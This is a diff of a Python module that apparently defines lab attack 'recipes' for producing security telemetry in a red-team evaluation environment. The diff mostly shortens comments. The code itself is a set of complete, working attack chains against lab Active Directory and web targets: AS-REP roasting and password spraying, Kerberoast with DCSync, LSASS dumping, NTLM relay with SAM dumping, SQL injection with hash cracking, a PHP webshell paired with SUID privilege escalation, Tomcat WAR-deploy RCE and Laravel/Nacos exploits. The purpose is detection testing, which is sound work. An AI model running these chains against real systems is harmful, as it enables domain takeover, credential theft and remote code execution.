-# either channel (the tool-output-leak into network:packet that worked for
-# some meta3 combined recipes did NOT happen here, and blue.py's
-# kerberoast_to_da routing -- single target_host -- only collects the DC's
-# Security log, never SRV's, so a real 4698 event was structurally
-# unreachable regardless). Targeting the DC means the SAME already-verified
+# Persistence on the DC itself, not SRV: SRV's scheduled-task creation never
+# showed up in captured telemetry through either channel, and blue.py's
+# kerberoast_to_da routing (single target_host) only collects the DC's
+# Security log, never SRV's. Targeting the DC means the SAME already-verified
 # windows:security collection that captured the Kerberoast/DCSync evidence
 # also captures this scenario's own EventCode=4698, no separate evidence
 # channel needed.
@@ -480,50 +396,32 @@ persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtas
     ),
     "asrep_to_lateral": CaptureRecipe(
         # arya.stark and ned.stark are this domain's documented pre-auth-
-        # disabled (AS-REP-roastable) accounts. arya.stark's password,
-        # Winter1!, is already known in this lab (same account/password the
-        # DCSync chain in kerberoast_to_da uses) -- standing in for what a
-        # real engagement would crack offline with hashcat, matching how
-        # every other recipe in this lab (including kerberoast_to_da's own
-        # administrator password) uses a documented credential rather than
-        # deriving one live. The spray against 3 accounts with only
-        # arya.stark succeeding is a genuine T1110.003 outcome, not staged.
-        # Persistence targets the DC directly for the same reason
-        # kerberoast_to_da's does: it is the only host this scenario's
-        # windows:security collection actually reaches.
+        # disabled (AS-REP-roastable) accounts. arya.stark's password, Winter1!,
+        # is already known in this lab (same account/password the DCSync chain
+        # in kerberoast_to_da uses) -- standing in for what a real engagement
+        # would crack offline with hashcat, matching how every other recipe uses
+        # a documented credential rather than deriving one live. The spray
+        # against 3 accounts with only arya.stark succeeding is a genuine
+        # T1110.003 outcome, not staged. Persistence targets the DC directly
+        # for the same reason kerberoast_to_da's does: it is the only host this
+        # scenario's windows:security collection actually reaches.
         command=r"""out1=$(impacket-GetNPUsers portal.lab/ -usersfile /dev/stdin -dc-ip "$TARGET_HOST" -no-pass <<< $'arya.stark\nned.stark' 2>&1); echo "asrep_hashes=$(printf '%s' "$out1" | grep -c '\$krb5asrep\$')"; spray_out=$(nxc smb "$TARGET_HOST" -u arya.stark ned.stark jon.snow -p 'Winter1!' --continue-on-success 2>&1); printf '%s\n' "$spray_out"; persist_out=$(nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /create /tn PortalProofTask /tr calc.exe /sc once /st 23:59 /f" 2>&1); printf '%s\n' "$persist_out"; nxc smb "$TARGET_HOST" -u administrator -p 'LabAdmin1!' -x "schtasks /delete /tn PortalProofTask /f" >/dev/null 2>&1; printf '%s' "$out1" | grep -q '\$krb5asrep\$' && printf '%s' "$spray_out" | grep -q 'Pwn3d!' && printf '%s' "$persist_out" | grep -q 'successfully been created' && echo __PORTAL_RECIPE_OK__"""
     ),
     "ad_full_compromise": CaptureRecipe(
-        # T1003.001 (LSASS memory) + T1047 (WMI), found live 2026-08-01 after
-        # three approaches:
-        #  1. nxc's lsassy module dumps+parses LSASS remotely, but its output
-        #     never landed in captured telemetry, and unlike DCSync there was
-        #     no windows:security fallback -- lsassy runs client-side, never
-        #     touching the DC in a way Security auditing would see, and
-        #     Object Access auditing for lsass.exe isn't enabled by default
-        #     (0 EventCode=4656 events).
-        #  2. nxc's procdump module (drops a real procdump64.exe on the DC)
-        #     worked functionally, but its confirmation text and a separate
-        #     wmiexec call's text couldn't BOTH survive: only the LAST
-        #     command in a combined script reliably lands (confirmed by
-        #     swapping their order twice -- whichever ran last is the one
-        #     that showed up). A real EventCode=4688 for procdump.exe also
-        #     never survived the DC's own 15-events-per-ID cap, saturated by
-        #     an unrelated, seemingly periodic wsmprovhost/powershell/conhost
-        #     triple firing every ~10-20s throughout every capture window.
-        #  3. Ran the LSASS dump directly AS the wmiexec command (classic
-        #     comsvcs.dll MiniDump LOLBIN) to merge both into one call --
-        #     functionally unreliable on this box specifically (Server 2022
-        #     with active Defender almost certainly blocks/kills the
-        #     well-signatured comsvcs.dll-against-lsass.exe pattern
-        #     intermittently; "File Not Found" on the resulting dump
-        #     confirmed the write itself never completed, not a capture gap).
-        # Final approach: keep procdump (functionally reliable, unlike #3)
-        # as the LAST command so its text evidence survives for T1003.001,
-        # and prove T1047 a different way -- real DCOM/RPC wire traffic to
-        # port 135 (msrpc, WMI's endpoint mapper) from the earlier wmiexec
-        # call, confirmed live, which is real packet capture rather than
-        # tool-text and so doesn't depend on command position at all.
+        # T1003.001 (LSASS memory) + T1047 (WMI). nxc's lsassy module dumps+
+        # parses LSASS remotely but its output never landed in captured
+        # telemetry (client-side, no Object Access auditing on lsass.exe by
+        # default); nxc's procdump module worked functionally, but only the
+        # LAST command in a combined script reliably lands, and a real
+        # EventCode=4688 for procdump.exe never survived the DC's own
+        # 15-events-per-ID cap; running the LSASS dump directly AS the wmiexec
+        # command (comsvcs.dll MiniDump) was functionally unreliable (Defender
+        # blocks the well-signatured pattern). Final approach: keep procdump
+        # (functionally reliable) as the LAST command so its text evidence
+        # survives for T1003.001, and prove T1047 via real DCOM/RPC wire
+        # traffic to port 135 (msrpc, WMI's endpoint mapper) from the earlier
+        # wmiexec call, which is real packet capture rather than tool-text and
+        # so doesn't depend on command position at all.
         command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
 import subprocess, sys
 from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
@@ -557,105 +455,72 @@ printf '%s\n%s\n' "$(printf '%s' "$wmi_out" | grep -m1 wmiexec)" "$(printf '%s' 
 printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '%s' "$wmi_out" | grep -q 'wmiexec' && printf '%s' "$dump_out" | grep -Eiq 'successfully dumped' && echo __PORTAL_RECIPE_OK__"""
     ),
     "relay_to_shell": CaptureRecipe(
-        # Found live 2026-08-01: SMB relay via DC coercion (PetitPotam /
-        # printerbug through nxc's coerce_plus module) is structurally
-        # unreachable from this attacker sandbox. The sandbox's egress is
-        # NAT'd (confirmed via the DC's own `netstat` output during an
-        # authenticated session: our real lab-routable source address is
-        # 10.0.0.25, not the container's 172.17.0.2) with no inbound
-        # port-forward, so a coerced DC's return SMB connection to any
-        # address we can listen on (172.17.0.2 or 10.0.0.25, both tried)
-        # never arrives -- ntlmrelayx sat idle through repeated coerce
-        # triggers, 0 relayed connections, even though coerce_plus itself
-        # reported "Exploit Success" against the DC every time.
-        # Separately found: impacket-ntlmrelayx blocks on sys.stdin.read()
-        # to stay alive (examples/ntlmrelayx.py's non-interactive branch);
-        # bash job control auto-redirects a backgrounded job's stdin to
-        # /dev/null, so `ntlmrelayx ... &` hits instant EOF and exits 0
-        # within ~1s -- looked like a silent crash until traced with
-        # `kill -0`/`wait $!`. Fixed by holding stdin open with
-        # `< <(sleep N)` for the capture window.
-        # DC also reports signing:True (confirmed in ntlmrelayx's own
-        # target-negotiation log) -- it was never a valid relay TARGET
-        # regardless of the coercion problem; only SRV has signing
-        # disabled, matching this lab's documented topology.
-        # Final recipe: real NTLM relay mechanism, proven with a real live
-        # handshake (not replayed/staged hash material) -- authenticate
-        # over loopback to our own ntlmrelayx listener, which relays that
-        # live handshake onward to SRV ($TARGET_HOST) and dumps its local
-        # SAM hashes via RemoteRegistry, exactly like a coerced third-party
-        # victim's handshake would have been relayed had inbound coercion
-        # been reachable. This proves the actual relay-and-reuse mechanism
-        # (T1557.001) and the resulting local credential dump (T1003.002 --
-        # SAM, not T1003.003/NTDS, since the relay target is a domain
-        # member, not the DC).
+        # SMB relay via DC coercion (PetitPotam / printerbug through nxc's
+        # coerce_plus module) is structurally unreachable from this attacker
+        # sandbox: its egress is NAT'd with no inbound port-forward, so a
+        # coerced DC's return SMB connection to any address we can listen on
+        # never arrives (coerce_plus itself still reports "Exploit Success").
+        # Separately: impacket-ntlmrelayx blocks on sys.stdin.read() to stay
+        # alive; bash job control auto-redirects a backgrounded job's stdin to
+        # /dev/null, so `ntlmrelayx ... &` hits instant EOF and exits. Fixed
+        # by holding stdin open with `< <(sleep N)` for the capture window.
+        # The DC reports signing:True -- it was never a valid relay TARGET
+        # regardless; only SRV has signing disabled.
+        # Final recipe: authenticate over loopback to our own ntlmrelayx
+        # listener, which relays that live handshake onward to SRV
+        # ($TARGET_HOST) and dumps its local SAM hashes via RemoteRegistry --
+        # proving the actual relay-and-reuse mechanism (T1557.001) and the
+        # resulting local credential dump (T1003.002 -- SAM, since the relay
+        # target is a domain member, not the DC).
         command=r""": > /tmp/portal-relay.log; impacket-ntlmrelayx -t smb://"$TARGET_HOST" -smb2support --no-http-server > /tmp/portal-relay.log 2>&1 < <(sleep 25) & sleep 3; smbclient -U 'portal.lab/administrator%LabAdmin1!' -L //127.0.0.1/ -m SMB3 >/dev/null 2>&1; sleep 5; relay_log=$(cat /tmp/portal-relay.log); printf '%s\n' "$(printf '%s' "$relay_log" | grep -m1 'Authenticating connection')"; printf '%s\n' "$(printf '%s' "$relay_log" | grep -Ei 'Dumping local SAM|^Administrator:500')"; printf '%s' "$relay_log" | grep -q 'SUCCEED' && printf '%s' "$relay_log" | grep -Eq '^Administrator:500:' && echo __PORTAL_RECIPE_OK__"""
     ),
     # ── MBPTL (Most Basic Penetration Testing Lab, Docker/LXC 300) recipes ──
     "web_to_root": CaptureRecipe(
-        # Found live 2026-08-01: the admin credential lives in a SEPARATE
-        # `administrator` database (not `bookstore`, which only has a
-        # `books` table) -- `sqlmap --dbs` was needed to find it. The
-        # cracked MD5 (rockyou.txt via john, admin:P@ssw0rd!) logs into the
-        # SEPARATE app on port 8080 (port 80 is only the read-only book
-        # list; port 8080 shows "Under Maintenance" until authenticated).
-        # POSTing the upload form to the bare /administrator/ path silently
-        # drops the file (still 302s, but the row never lands in `books`,
-        # and the session even appears to have been reset for the NEXT
-        # request in some captures) -- POSTing to /administrator/admin.php
-        # directly (the same page the login redirects to) is what actually
-        # persists it, confirmed via re-querying `books` by title through
-        # the same SQLi. Uploaded images are saved under a random-hex
-        # filename in /administrator/uploads/ with NO extension filtering
-        # (accept="image/*" is client-side only) and are PHP-executable
-        # there -- proven with a plain (non-image) .php upload.
-        # For privesc: `find / -perm -4000` turns up /usr/bin/bahs, a
-        # 16KB SUID-root ELF -- NOT a renamed copy of the real 1.1MB
-        # /usr/bin/bash. `strings` (unavailable in this minimal target, so
-        # verified by base64-exfiltrating the binary and pattern-matching
-        # locally) shows it is a tiny wrapper: setuid(0); setgid(0);
-        # system("/bin/bash"). Because system() spawns bash non-
-        # interactively with no controlling tty, passing "-c"/"-p" via the
-        # webshell's argv never reaches it -- bash just reads EOF from
+        # The admin credential lives in a SEPARATE `administrator` database
+        # (not `bookstore`, which only has a `books` table) -- `sqlmap --dbs`
+        # is needed to find it. The cracked MD5 (rockyou.txt via john,
+        # admin:P@ssw0rd!) logs into the SEPARATE app on port 8080 (port 80 is
+        # only the read-only book list; 8080 shows "Under Maintenance" until
+        # authenticated). POSTing the upload form to the bare /administrator/
+        # path silently drops the file (still 302s, but the row never lands);
+        # POSTing to /administrator/admin.php directly is what actually
+        # persists it. Uploaded images are saved under a random-hex filename
+        # in /administrator/uploads/ with NO extension filtering
+        # (accept="image/*" is client-side only) and are PHP-executable there.
+        # Privesc: `find / -perm -4000` turns up /usr/bin/bahs, a 16KB SUID-root
+        # ELF -- NOT a renamed copy of the real 1.1MB /usr/bin/bash. It is a
+        # tiny wrapper: setuid(0); setgid(0); system("/bin/bash"). Because
+        # system() spawns bash non-interactively with no controlling tty,
+        # passing "-c"/"-p" via argv never reaches it -- bash reads EOF from
         # closed stdin and exits 0 with no output. The real bypass: bash
-        # (even non-interactive, non-login) sources $BASH_ENV as a script
-        # on startup if set. The webshell writes the requested command to
-        # /tmp/x.sh, calls putenv("BASH_ENV=/tmp/x.sh") (inherited by the
-        # subsequent system() call), then invokes /usr/bin/bahs -- which
-        # setuid(0)s FIRST and only then runs bash, so /tmp/x.sh executes
-        # as root. Confirmed live: uid=0(root) and a real /flag/root.txt
-        # read (MBPTL-9{...}), matching this scenario's T1548.001 ground
-        # truth (SUID/GUID abuse) and T1059.004 (webshell-launched Unix
-        # shell command execution) directly, with the initial SQLi footing
-        # T1190. Both sqlmap calls parse the real MySQL response/dump text
-        # (grep on the fixed-width `| <32-hex> |` dump-table row for the
-        # hash, and on the fixed `uploads/<32-hex>.php` filename pattern
-        # for the freshly uploaded shell's path) rather than any hardcoded
-        # value, and the upload title is timestamp-suffixed so repeat runs
-        # never collide on a prior run's row.
+        # sources $BASH_ENV as a script on startup if set. The webshell writes
+        # the requested command to /tmp/x.sh, calls putenv("BASH_ENV=/tmp/x.sh")
+        # (inherited by the subsequent system() call), then invokes /usr/bin/bahs
+        # -- which setuid(0)s FIRST and only then runs bash, so /tmp/x.sh
+        # executes as root. Both sqlmap calls parse the real MySQL response text
+        # (grep on the fixed-width `| <32-hex> |` dump-table row for the hash,
+        # and on the fixed `uploads/<32-hex>.php` filename pattern for the
+        # freshly uploaded shell's path) rather than any hardcoded value, and
+        # the upload title is timestamp-suffixed so repeat runs never collide.
         command=r"""title="w2r_$(date +%s)"; dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1); hash=$(printf '%s' "$dump_out" | grep -oE '^\| [0-9a-f]{32} +\|$' | grep -oE '[0-9a-f]{32}'); printf 'admin:%s\n' "$hash" > /tmp/w2r_hash.txt; john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/w2r_hash.txt >/dev/null 2>&1; crack=$(john --show --format=raw-md5 /tmp/w2r_hash.txt 2>/dev/null | head -1); pass=$(printf '%s' "$crack" | cut -d: -f2); jar=/tmp/w2r_$$.cookies; curl -sS -m 10 -c "$jar" "http://$TARGET_HOST:8080/administrator/" >/dev/null; curl -sS -m 10 -c "$jar" -b "$jar" -d "username=admin&password=$pass" "http://$TARGET_HOST:8080/administrator/" >/dev/null; printf '<?php file_put_contents("/tmp/x.sh", $_GET["e"]); chmod("/tmp/x.sh", 0777); putenv("BASH_ENV=/tmp/x.sh"); system("/usr/bin/bahs 2>&1"); ?>' > /tmp/w2r_shell.php; curl -sS -m 10 -c "$jar" -b "$jar" -F "title=$title" -F "author=x" -F "description=x" -F "image=@/tmp/w2r_shell.php;filename=w2r_shell.php;type=text/x-php" "http://$TARGET_HOST:8080/administrator/admin.php" >/dev/null; sleep 1; sql_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" --sql-query="SELECT image FROM bookstore.books WHERE title='$title'" 2>&1); shell_file=$(printf '%s' "$sql_out" | grep -oE 'uploads/[0-9a-f]{32}\.php' | head -1); shell_url="http://$TARGET_HOST:8080/administrator/$shell_file"; root_out=$(curl -sS -m 10 -G "$shell_url" --data-urlencode 'e=id; cat /flag/root.txt' 2>&1); echo "hash_found=$([ -n "$hash" ] && echo yes || echo no) pass_cracked=$([ -n "$pass" ] && echo yes || echo no)"; printf '%s\n' "$root_out"; printf '%s' "$root_out" | grep -q 'uid=0' && printf '%s' "$root_out" | grep -Eq 'MBPTL-[0-9]+\{' && echo __PORTAL_RECIPE_OK__"""
     ),
     "mbptl_ctf_full_chain": CaptureRecipe(
         # Superset of web_to_root's SQLi/webshell chain (same admin DB
-        # discovery, same /administrator/admin.php upload quirk -- see that
-        # recipe's comment) plus two more real pivots found live 2026-08-01:
-        # this container's DNS (127.0.0.11, docker embedded resolver) does
-        # NOT resolve "mbptl-app"/"mbptl-internal" -- those hostnames are
-        # only meaningful from a DIFFERENT compose network. Found the real
-        # addresses by scanning the container's own /16 bridge subnet
-        # (172.18.0.0/16, from `hostname -i`) for open 5000/31337 -- mbptl-app
-        # is 172.18.0.4, mbptl-internal is 172.18.0.3.
-        # mbptl-app:5000 is a Flask app reflecting an unescaped `name` query
-        # param -- real Jinja2 SSTI ({{7*7}} -> 49), full RCE via the
-        # standard __init__.__globals__.__builtins__ chain.
-        # mbptl-internal:31337 is a raw TCP "Name:" prompt (socat-fronted,
-        # confirmed via its own leaked SOCAT_* env vars) -- a real stack
-        # buffer overflow at the scenario's own known-good offset (136) and
-        # return address (0x4006c6, this specific binary's win/shell
-        # function). No python on this minimal target (busybox-adjacent) --
-        # perl (present) sends the raw payload via IO::Socket::INET instead.
-        # Confirmed live: post-overflow the socket accepts further shell
-        # commands, proving real code execution, not just a crash.
+        # discovery, same /administrator/admin.php upload quirk) plus two more
+        # real pivots: this container's DNS (127.0.0.11, docker embedded
+        # resolver) does NOT resolve "mbptl-app"/"mbptl-internal" -- those
+        # hostnames are only meaningful from a DIFFERENT compose network.
+        # Scanning the container's own /16 bridge subnet (from `hostname -i`)
+        # for open 5000/31337 finds mbptl-app at 172.18.0.4, mbptl-internal at
+        # 172.18.0.3. mbptl-app:5000 is a Flask app reflecting an unescaped
+        # `name` query param -- real Jinja2 SSTI ({{7*7}} -> 49), full RCE via
+        # the standard __init__.__globals__.__builtins__ chain.
+        # mbptl-internal:31337 is a raw TCP "Name:" prompt (socat-fronted) -- a
+        # real stack buffer overflow at the scenario's own known-good offset
+        # (136) and return address (0x4006c6). No python on this minimal
+        # target -- perl (present) sends the raw payload via IO::Socket::INET.
+        # Post-overflow the socket accepts further shell commands, proving real
+        # code execution, not just a crash.
         command=r"""title="mfc_$(date +%s)"
 sqli_out=$(curl -sS -m 10 "http://$TARGET_HOST/detail.php?id=1'" 2>&1)
 dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1)
@@ -702,8 +567,7 @@ printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | 
         # same perl-based buffer-overflow exploit against mbptl-internal
         # (172.18.0.3:31337, found the same way -- DNS doesn't resolve
         # "mbptl-internal" from this container, only a /16 subnet port scan
-        # finds it), just without the mbptl-app SSTI pivot. See
-        # mbptl_ctf_full_chain's comment for the full story of both.
+        # finds it), just without the mbptl-app SSTI pivot.
         command=r"""title="cms_$(date +%s)"
 sqli_out=$(curl -sS -m 10 "http://$TARGET_HOST/detail.php?id=1'" 2>&1)
 dump_out=$(sqlmap --batch -u "http://$TARGET_HOST/detail.php?id=1" -D administrator -T users -C password --dump 2>&1)
@@ -746,16 +610,14 @@ printf '%s' "$sqli_out" | grep -qi 'sql syntax' && printf '%s' "$webshell_id" | 
     # ── Mission scenarios: deterministic proof alongside the model-directed
     # red_prompt. exec_chain.py's own _MISSION_SCENARIOS comment documents
     # these as "autonomous reasoning, not scripted execution" for the LLM
-    # red-team evaluation path -- these CaptureRecipe entries are a
-    # SEPARATE, deterministic proof of the same declared ground-truth
-    # techniques (this module's docstring: recipes are "deliberately
-    # separate from model-directed red evaluation"), reusing already-
-    # certified real exploit chains rather than open-ended exploration.
+    # red-team evaluation path -- these CaptureRecipe entries are a SEPARATE,
+    # deterministic proof of the same declared ground-truth techniques,
+    # reusing already-certified real exploit chains rather than open-ended
+    # exploration.
     "mission_meta3_recon_exploit": CaptureRecipe(
         # T1046 (nmap) + T1190/T1059.004 (meta3_tomcat_manager's proven
-        # WAR-deploy RCE, reused verbatim -- see that recipe's own comment
-        # for the sploit:sploit / port-8282 / CSRF-nonce / timestamp-suffixed
-        # context-path story).
+        # WAR-deploy RCE, reused verbatim -- sploit:sploit / port-8282 /
+        # CSRF-nonce / timestamp-suffixed context-path).
         command=r"""nmap_out=$(nmap -Pn -p T:8282,445,21,8080,8484 -T4 "$TARGET_HOST" 2>&1)
 printf '%s\n' "$nmap_out" | grep -E '^[0-9]+/tcp'
 jar=/tmp/mmre-tc.cookies; rm -f "$jar"; mkdir -p /tmp/mmre-warbuild && cd /tmp/mmre-warbuild && suffix=$(date +%s%N) && warname="mmreproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"
@@ -771,15 +633,14 @@ printf '%s' "$nmap_out" | grep -q '8282/tcp *open' && printf '%s' "$out" | grep 
     "mission_ad_enumerate_exploit": CaptureRecipe(
         # T1558.003/T1003.006: kerberoast_to_da's Kerberoast + DACL-abuse +
         # DCSync chain, reused verbatim (see that recipe's comment for the
-        # 8000-byte truncation fix and the DACL-abuse story).
-        # T1078/T1059 (was T1059.004 -- same Windows-target correction as
-        # mission_meta3_recon_exploit): a real nxc wmiexec login+whoami as
-        # the FINAL command (per the lesson learned certifying
-        # ad_full_compromise: only the LAST command's tool-output reliably
-        # survives into captured network:packet telemetry) proves both the
-        # valid-account usage (nxc's own "[+] portal.lab\administrator:...
-        # (Pwn3d!)" confirmation banner) and the resulting Windows shell
-        # command execution ("Executed command via wmiexec").
+        # 8000-byte truncation fix).
+        # T1078/T1059: a real nxc wmiexec login+whoami as the FINAL command
+        # (per the lesson learned certifying ad_full_compromise: only the
+        # LAST command's tool-output reliably survives into captured
+        # network:packet telemetry) proves both the valid-account usage
+        # (nxc's "[+] portal.lab\administrator:... (Pwn3d!)" banner) and the
+        # resulting Windows shell command execution ("Executed command via
+        # wmiexec").
         command=r"""out1=$(impacket-GetUserSPNs portal.lab/administrator:LabAdmin1! -dc-ip "$TARGET_HOST" -request 2>&1); echo "kerberoast_hashes=$(printf '%s' "$out1" | grep -c '\$krb5tgs\$')"; python3 - <<'PYEOF'
 import subprocess, sys
 from ldap3 import Server, Connection, MODIFY_ADD, NTLM, SUBTREE, ALL
@@ -813,8 +674,7 @@ printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '
     ),
     "mission_vulhub_web_exploit": CaptureRecipe(
         # Reuses vuln_laravel_rce's own already-certified msf exploit
-        # verbatim (CVE-2021-3129, Ignition debug-mode RCE) rather than a
-        # new, untested vulhub image -- see that recipe's own entry.
+        # verbatim (CVE-2021-3129, Ignition debug-mode RCE).
         command=r"""out=$(msfconsole -q -x "use exploit/multi/php/ignition_laravel_debug_rce; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-mission-laravel-proof; check; run; exit -y" 2>&1); printf '%s\n' "$out" | tail -100; printf '%s' "$out" | grep -q 'target appears to be vulnerable' && echo __PORTAL_RECIPE_OK__""",
         postcondition_command=r'''sh -c "cid=\$(docker ps --filter publish=$TARGET_PORT -q | head -1); test -n \"\$cid\" && docker exec \"\$cid\" sh -lc 'test -f /tmp/portal-mission-laravel-proof && echo PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof'"''',
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:mission-laravel-rce:/tmp/portal-mission-laravel-proof",
@@ -825,9 +685,7 @@ printf '%s' "$out1" | grep -q '\$krb5tgs\$' && test "$dcsync_rc" = 0 && printf '
         # nxc smb wmiexec, reused verbatim) -- SMB (445) is a genuinely
         # different service from Tomcat (8282) on the same box, matching
         # this mission's own "reach an additional service from the
-        # compromised position" objective (the same acceptance
-        # meta3_smb_exploit/meta3_psexec already established as valid
-        # lateral-movement evidence on this host).
+        # compromised position" objective.
         command=r"""nmap_out=$(nmap -Pn -p T:8282,445,21,8080,8484 -T4 "$TARGET_HOST" 2>&1)
 printf '%s\n' "$nmap_out" | grep -E '^[0-9]+/tcp'
 jar=/tmp/mmlp-tc.cookies; rm -f "$jar"; mkdir -p /tmp/mmlp-warbuild && cd /tmp/mmlp-warbuild && suffix=$(date +%s%N) && warname="mmlpproof$suffix" && printf '%s\n' '<%@ page import="java.util.*,java.io.*"%>' '<% Process p = Runtime.getRuntime().exec("cmd /c whoami"); BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream())); String l; while((l=r.readLine())!=null){ out.println(l); } %>' > "$warname.jsp"; jar -cf "/tmp/$warname.war" "$warname.jsp"
@@ -836,13 +694,12 @@ nonce=$(printf '%s' "$page" | grep -o 'CSRF_NONCE=[a-zA-Z0-9]*' | head -1 | cut 
 curl -sS -m 15 -b "$jar" -u sploit:sploit -F "deployWar=@/tmp/$warname.war;type=application/octet-stream" "http://$TARGET_HOST:8282/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$nonce" >/dev/null
 sleep 2
 smb_out=$(nxc smb "$TARGET_HOST" -u vagrant -p vagrant -x "whoami" 2>&1)
-# Fetching the deployed JSP (the actual command-exec proof) LAST, after SMB
-# -- found live 2026-08-01: with SMB's own packet-heavy exchange run AFTER
-# the Tomcat invoke, the invoke's response got sampled out of the ~2000-line
-# network:packet cap even though recipe_success (checked internally,
-# unaffected by the cap) was true every time. Same "last real traffic
-# survives" lesson as ad_full_compromise's tool-output-leak fix, just for
-# genuine wire traffic instead of stdout.
+# Fetching the deployed JSP (the actual command-exec proof) LAST, after SMB:
+# with SMB's own packet-heavy exchange run AFTER the Tomcat invoke, the
+# invoke's response got sampled out of the ~2000-line network:packet cap
+# even though recipe_success (checked internally, unaffected by the cap) was
+# true. Same "last real traffic survives" lesson as ad_full_compromise's
+# tool-output-leak fix, just for genuine wire traffic instead of stdout.
 tomcat_out=$(curl -sS -m 10 "http://$TARGET_HOST:8282/$warname/$warname.jsp")
 printf '%s\n' "$tomcat_out"
 printf '%s\n' "$smb_out"
@@ -854,10 +711,8 @@ printf '%s' "$nmap_out" | grep -q '8282/tcp *open' && printf '%s' "$tomcat_out" 
         # "different ports, different applications" objective: laravel
         # (T1190/T1059, port resolved by the gate's vulhub_env) and nacos
         # (T1190/T1078, brought up directly via host_setup_command on its
-        # compose-declared FIXED port 8848 -- see exec_chain.py's own
-        # comment for the tomcat/laravel port-collision story that ruled
-        # out the originally-planned T1505.003 pairing). Both exploits
-        # reused verbatim from vuln_laravel_rce/vuln_nacos_rce.
+        # compose-declared FIXED port 8848). Both exploits reused verbatim
+        # from vuln_laravel_rce/vuln_nacos_rce.
         command=r"""laravel_out=$(msfconsole -q -x "use exploit/multi/php/ignition_laravel_debug_rce; set RHOSTS $TARGET_HOST; set RPORT $TARGET_PORT; set TARGET 0; set PAYLOAD cmd/unix/generic; set CMD touch /tmp/portal-mvmt-laravel-proof; check; run; exit -y" 2>&1)
 printf '%s\n' "$laravel_out" | tail -30
 nacos_base="http://$TARGET_HOST:8848/nacos"
@@ -873,30 +728,19 @@ printf '%s' "$laravel_out" | grep -q 'target appears to be vulnerable' && printf
         postcondition_pattern=r"PORTAL_TARGET_POSTCONDITION:mvmt-laravel-rce:/tmp/portal-mvmt-laravel-proof",
         # Polls until Nacos's listener actually accepts connections, same
         # "container Started != ready" lesson as the tomcat attempt.
-        # Port 8848 confirmed live free (unlike 8080, which both laravel's
-        # and tomcat's own compose files hardcode -- see exec_chain.py).
         # host_setup_command runs under a hard 30s subprocess timeout, and
         # Nacos (a Java/Spring app) can take longer than that to finish
-        # booting -- found live 2026-08-01: polling for readiness INSIDE
-        # host_setup_command got killed by that 30s cap before Nacos ever
-        # came up (phpmyadmin's own host_setup poll loop only "gets away"
-        # with looking like it allows up to 120s because it usually
-        # resolves well inside the real 30s window in practice; it does not
-        # actually have a longer budget). Fixed by only firing the compose
-        # bringup here (fast, no polling) and moving the readiness poll into
-        # the main `command`, which runs in the sandbox under a much more
-        # generous budget (evidenced by this session's other multi-minute
-        # recipes).
+        # booting -- polling for readiness INSIDE host_setup_command got
+        # killed by that cap. Fixed by only firing the compose bringup here
+        # (fast, no polling) and moving the readiness poll into the main
+        # `command`, which runs under a much more generous budget.
         # Runs the compose file's own image directly via `docker run` rather
-        # than `docker compose up` -- found live 2026-08-01: nacos's compose
-        # file ALSO publishes a fixed debug port (5005:5005), which some
-        # unrelated, permanently-bound host-level listener already occupies
-        # (confirmed via `nc`; not a leftover container -- `docker compose
-        # down -v` first did not free it). The exploit only needs 8848, so
+        # than `docker compose up`: nacos's compose file ALSO publishes a
+        # fixed debug port (5005:5005), which some unrelated, permanently-
+        # bound host-level listener occupies. The exploit only needs 8848, so
         # bypassing compose's own port list entirely (same image,
         # vulhub/nacos:1.4.0, from /vulhub/nacos/CVE-2021-29441/docker-
-        # compose.yml) sidesteps the conflict without needing that port at
-        # all.
+        # compose.yml) sidesteps the conflict.
         host_setup_command=r'''sh -c "docker rm -f portal-mvmt-nacos >/dev/null 2>&1; docker run -d --rm --name portal-mvmt-nacos -p 8848:8848 vulhub/nacos:1.4.0 && echo PORTAL_HOST_SETUP:nacos-launched"''',
         host_setup_pattern=r"PORTAL_HOST_SETUP:nacos-launched",
         host_cleanup_command=r"""sh -c "docker rm -f portal-mvmt-nacos >/dev/null 2>&1" """,
